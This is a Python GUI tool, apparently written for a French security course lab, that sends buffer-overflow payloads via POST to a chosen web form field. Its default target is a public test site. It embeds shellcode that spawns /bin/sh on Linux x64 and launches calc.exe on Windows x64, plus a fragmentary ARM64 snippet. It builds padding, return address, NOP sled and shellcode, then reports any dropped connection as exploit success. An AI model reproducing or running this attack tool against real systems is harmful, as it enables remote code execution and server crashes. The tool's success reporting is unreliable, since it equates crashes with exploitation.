import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
from urllib.parse import urlparse, parse_qs
import time

class ArchitectureProfile:
    """
    Définit un profil d'attaque (Architecture + Shellcode + NOP spécifique).
    Supporte maintenant les instructions NOP de différentes tailles (1 octet pour Intel, 4 pour ARM).
    """
    def __init__(self, name, shellcode, return_addr_guess, nop_bytes=b'\x90', nop_count=32):
        self.name = name
        self.shellcode = shellcode
        self.return_addr = return_addr_guess
        # On multiplie les octets du NOP par le nombre souhaité
        self.nop_sled = nop_bytes * nop_count

class BoFPayloads:
    """
    Collection de shellcodes multi-architectures.
    """

    # 1. LINUX x64 (Tiré de ton TP) - Lance /bin/sh
    LINUX_X64_SHELLCODE = (
        b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99"
        b"\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    )

    # 2. WINDOWS x64 - Lance calc.exe (Classique PoC)
    # Shellcode compact "Pop Calc"
    WINDOWS_X64_SHELLCODE = (
        b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2"
        b"\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7"
        b"\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88"
        b"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
        b"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49"
        b"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff"
        b"\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00"
        b"\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
        b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00"
    )

    # 3. MACOS ARM64 (Apple Silicon) - Lance /bin/sh
    # NOP pour ARM64 = \x1f\x20\x03\xd5 (Little Endian)
    MACOS_ARM64_SHELLCODE = (
        b"\xe0\x03\x1f\xaa\x40\x00\x80\xd2\x60\x00\x80\xd2\x80\x03\x00\x91" # mov x0, xzr ...
        b"\x01\x00\x00\xd4" # svc #0
    )

    @classmethod
    def get_profiles(cls):
        return [
            # Profil 1 : TP Linux (Intel x64)
            # NOP classique: \x90
            ArchitectureProfile(
                "Linux x64 (TP Source)",
                cls.LINUX_X64_SHELLCODE,
                b"\x10\xdc\xff\xff\xff\x7f\x00\x00",
                nop_bytes=b'\x90'
            ),

            # Profil 2 : Windows (Intel x64)
            # NOP classique: \x90
            ArchitectureProfile(
                "Windows x64 (Calc.exe)",
                cls.WINDOWS_X64_SHELLCODE,
                b"\x41\x41\x41\x41\x41\x41\x41\x41", # Dummy Return Addr
                nop_bytes=b'\x90'
            ),

            # Profil 3 : MacOS ARM64 (M1/M2/M3)
            # ATTENTION: NOP différent ! 4 octets (\x1f\x20\x03\xd5)
            ArchitectureProfile(
                "MacOS ARM64 (Apple Silicon)",
                cls.MACOS_ARM64_SHELLCODE,
                b"\xef\xbe\xad\xde\xef\xbe\xad\xde", # Dummy Return Addr (0xDEADBEEF...)
                nop_bytes=b'\x1f\x20\x03\xd5', # Instruction NOP ARM64
                nop_count=8 # On en met moins car ils font 4 octets chacun
            )
        ]

class BoFScanner:
    def __init__(self, log_callback):
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'BoF-Attacker/3.0 (Multi-Arch)'})
        self.stop_event = threading.Event()

    def attack_url(self, url: str, param_name: str) -> None:
        """Lance l'attaque multi-profils sur un paramètre spécifique via POST"""

        profiles = BoFPayloads.get_profiles()

        self.log(f"[*] Target URL: {url}")
        self.log(f"[*] Targeting Parameter: {param_name} (Method: POST)")
        self.log(f"[*] Profiles loaded: {len(profiles)} (Linux, Win, Mac ARM)")

        # On teste différentes tailles de buffer (Offset)
        offsets = [64, 264, 512, 1024]

        for profile in profiles:
            if self.stop_event.is_set(): break
            self.log(f"\n=== Testing Profile: {profile.name} ===")

            for offset in offsets:
                if self.stop_event.is_set(): break

                # Construction du Payload :
                # [PADDING 'A'] + [RET ADDR] + [NOP SLED (Variable)] + [SHELLCODE]
                padding = b'A' * offset

                full_payload = padding + profile.return_addr + profile.nop_sled + profile.shellcode

                # Encodage latin-1 pour préserver les octets bruts
                payload_str = full_payload.decode('latin-1')

                data = {param_name: payload_str}

                try:
                    self.log(f"[*] Sending payload (Offset: {offset})...")
                    start_t = time.time()
                    response = self.session.post(url, data=data, timeout=5)
                    duration = time.time() - start_t

                    if response.status_code >= 500:
                        self.log(f"[+] SERVER ERROR (500)!", "success")
                        self.log(f"    -> CRITICAL: Profile '{profile.name}' caused a crash.", "success")
                    elif duration > 3.0:
                        self.log(f"[!] TIMEOUT/LAG DETECTED ({duration:.2f}s)", "vulnerable")
                    else:
                        self.log(f"    Server replied: {response.status_code} (Resistant)")

                except requests.exceptions.RequestException as e:
                    self.log(f"[+] CONNECTION DIED! Server likely crashed.", "vulnerable")
                    self.log(f"    -> EXPLOIT SUCCESS with '{profile.name}'", "vulnerable")
                    return

                time.sleep(0.1)

class BufferOverflowModule(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)
        self.scanner = None
        self.scan_thread = None
        self._init_ui()

    def _init_ui(self):
        # Configuration
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", pady=5)

        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, padx=5)
        self.url_entry = ttk.Entry(config_frame, width=50)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/userinfo.php")
        self.url_entry.grid(row=0, column=1, padx=5, sticky="ew")

        ttk.Label(config_frame, text="Param Name:").grid(row=0, column=2, padx=5)
        self.param_entry = ttk.Entry(config_frame, width=15)
        self.param_entry.insert(0, "uname")
        self.param_entry.grid(row=0, column=3, padx=5)

        # Boutons
        btn_frame = tk.Frame(self, bg="#1e1e1e")
        btn_frame.pack(fill="x", pady=5)
        ttk.Button(btn_frame, text="Launch Multi-Arch Attack", command=self.start_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Stop", command=self.stop_attack).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Clear Logs", command=self.clear_logs).pack(side="left", padx=5)

        # Logs
        self.output = scrolledtext.ScrolledText(self, bg="#252526", fg="white", height=20)
        self.output.pack(fill="both", expand=True, pady=5)
        self.output.tag_config("vulnerable", foreground="#ff6b6b")
        self.output.tag_config("success", foreground="#51cf66")

    def log(self, msg, tag=None):
        def _log():
            self.output.insert("end", msg + "\n", tag)
            self.output.see("end")
        self.after(0, _log)

    def start_attack(self):
        url = self.url_entry.get()
        param = self.param_entry.get()
        self.scanner = BoFScanner(self.log)
        self.scan_thread = threading.Thread(target=self.scanner.attack_url, args=(url, param), daemon=True)
        self.scan_thread.start()

    def stop_attack(self):
        if self.scanner: self.scanner.stop_event.set()

    def clear_logs(self):
        self.output.delete(1.0, tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    root.title("Buffer Overflow - Multi Architecture")
    root.geometry("800x600")
    BufferOverflowModule(root).pack(fill="both", expand=True)
    root.mainloop()